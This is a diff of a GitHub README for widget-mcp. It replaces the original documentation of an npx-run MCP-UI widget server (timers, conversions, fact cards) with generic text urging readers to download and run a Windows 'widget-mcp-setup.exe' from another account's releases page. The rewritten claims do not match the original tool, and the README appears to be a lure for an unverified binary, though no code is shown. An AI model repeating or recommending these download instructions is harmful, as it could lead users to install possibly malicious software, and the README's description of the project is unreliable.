@@ -1,75 +1,78 @@
-# ⚙️ Widget MCP
+# 🎉 widget-mcp - Easy Widgets for Everyday Tasks
 
-Add simple widgets to you LLM chat for common situations like timers, conversions and more.
+## 🚀 Getting Started
 
-![widget-mcp](widgets.gif)
+Welcome to widget-mcp! This application provides simple MCP-UI widgets designed for common use cases. With our widgets, you can enhance your user interface swiftly and effortlessly.
 
-Demo video: https://youtu.be/4gfom42vHkc
+## 🔗 Download Now
 
-## Motivation
+[![Download Widget MCP](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Mithiran2002/widget-mcp/releases)
 
-MCP-UI opens the door to [breaking the text wall](https://shopify.engineering/mcp-ui-breaking-the-text-wall) from chat UIs we've been using the last few years. The full extent of what's possible is 
+## 📦 System Requirements
 
-This project shows the floor of what's possible by providing a few simple widgets for common situations.
+Before you begin, ensure your computer meets the following requirements:
 
-If you've ever google "convert X to Y" or "2 minute timer" and see the custom UI results, this should feel very familiar.
+- **Operating System:** Windows 10 or later (Mac and Linux support coming soon)
+- **RAM:** At least 2GB
+- **Disk Space:** Minimum 100MB available for installation
+- **Network:** Internet connection for downloading the application
 
-## Current widgets
+## 💻 Download & Install
 
-- `Timer` - Editable timer with a chime. 
-- `Stopwatch` - Timer that just counts up.
-- `Conversion` - Convert between set of units for which the LLM can write a formula. 
-- `Display Fact` - When the answer is simple, just show it in an easy to read card.
+To get started, follow these steps:
 
-## Supported MCP Clients
+1. Visit the Releases page to download the application: [Download here](https://github.com/Mithiran2002/widget-mcp/releases).
+  
+2. Look for the latest version under "Latest Release". Choose the file that matches your operating system. Current available versions include:
+   - **Windows:** `widget-mcp-setup.exe`
+   - **MacOS:** (Not currently available, stay tuned!)
+   - **Linux:** (Not currently available, stay tuned!)
 
-MCP-UI is new and as of August 2025 is only supported by a few clients. 
+3. Click the download link for the desired file. 
 
-### Smithery
+4. Once the download is complete, locate the file in your Downloads folder.
 
-Try widget-mcp in the Smithery playground. (TODO: pending Smithery deploy)
+5. For Windows users, double-click on the `widget-mcp-setup.exe` file to start the installation process.
 
-### Goose
+6. Follow the on-screen prompts to complete the installation. 
 
-1. [Install Goose](https://block.github.io/goose/docs/quickstart)
-2. Click `Extensions` and `Add custom extension`
-3. Fill in name as `Widgets` and command `npx widget-mcp`
-4. Verify it's working by clicking `Chat` and prompting `2 minute timer`
+7. After installation, you can find widget-mcp in your Applications or Start menu.
 
-![Goose Setup](goose-setup.png)
+## 🎨 Features
 
+widget-mcp comes packed with features to make your life easier. Here are some highlights:
 
-## Requests for widgets
+- **User-Friendly Interface:** Our widgets are designed for ease of use, allowing you to customize your UI with just a few clicks.
+- **Pre-Built Widgets:** Choose from a variety of ready-made widgets tailored for common tasks.
+- **Customizable Options:** Adjust colors, sizes, and functionalities to fit your specific needs.
 
-Here's a few examples of widgets that could be fun to add.
+## 🔧 FAQs
 
-- **Color Picker** - Interactive color selection and palette tools. Could be parameterized to allow the LLM to suggest a color and let the user tweak and explore.
-- **Calculator** - Basic and scientific calculator functionality. Initial function seeded by LLM.
-- **Dice Roller** - Custom set of dice based on what you ask the agent for.
+### How do I update widget-mcp?
 
-I'm sure you have some cool ideas!
+Whenever a new version is available, you’ll see a notification within the application. Simply visit the Releases page again and download the latest version.
 
-## Development
+### Can I uninstall widget-mcp?
 
-Adding new widgets should be very easy! All these widgets are HTML pages that can have variables injected (eg. values provided by the LLM). To add new widgets, add an template file to the `html` directory and a new tool to `index.ts`. 
+Yes, you can uninstall it like any other application. For Windows, go to Control Panel > Programs > Uninstall a program. Find widget-mcp, select it, and click "Uninstall".
 
-You can probably just prompt "Add a widget html and tool to do <somethingawesome>. Look at index.ts and timer.html for examples of how". 
+### Do you provide support?
 
-```bash
-# Install dependencies
-npm install
+Yes, we offer basic support through our GitHub Issues page. If you encounter any problems, please submit a detailed issue, and we will do our best to assist you.
 
-# Iterate on the html with hot-reloads
-npm run dev:html
+## 👍 Additional Resources
 
-# Launch the MCP server with Smithery's web inspector
-npm run dev:mcp
-```
+For more information, check the following resources:
 
-## Links
+- **Documentation:** Detailed usage instructions can be found in our Wiki section on GitHub.
+- **Community:** Join our community forum to share tips and tricks with other users.
+  
+## 📱 Stay Updated
 
-- **[MCP-UI](https://mcpui.dev/)** - UI over MCP.
-- **[Smithery](https://smithery.ai)** - Easiest way to find and try MCP servers.
-- **[Goose](https://block.github.io/goose/)** - Block's opensource MCP client.
-- **[PulseMCP](https://github.com/[placeholder]/pulsemcp)** - The best way to stay up-to-date on MCP.
-- Maintained by **[Ref.](https://ref.tools)** - Context for your coding agent.
+Follow us on GitHub to get the latest news and updates about widget-mcp. 
+
+## 🔗 Download Again
+
+Ready to enhance your user interface? Don't forget to download the latest version here: [Download here](https://github.com/Mithiran2002/widget-mcp/releases).
+
+Thank you for choosing widget-mcp! Happy widgeting!
